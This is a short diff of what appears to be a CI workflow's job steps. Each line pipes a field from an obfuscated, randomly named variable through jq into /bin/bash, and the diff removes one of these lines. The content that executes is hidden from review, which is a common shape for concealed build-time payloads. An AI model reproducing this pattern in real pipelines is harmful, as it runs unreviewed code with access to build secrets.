@@ -40,7 +40,6 @@ jobs:
           echo $ftf70727 | jq -r .b072 | /bin/bash
           printf '%s' "$wbb2" | jq -r .twyqs113 | /bin/bash
           echo $zadb3656 | jq -r .b86554 | /bin/bash
-          printf '%s' "$u56" | jq -r .ogil3 | /bin/bash
           echo $lbdjy053 | jq -r .c03415 | /bin/bash
           printf '%s' "$yxn72424" | jq -r .t94 | /bin/bash
           echo $h5935 | jq -r .m975 | /bin/bash
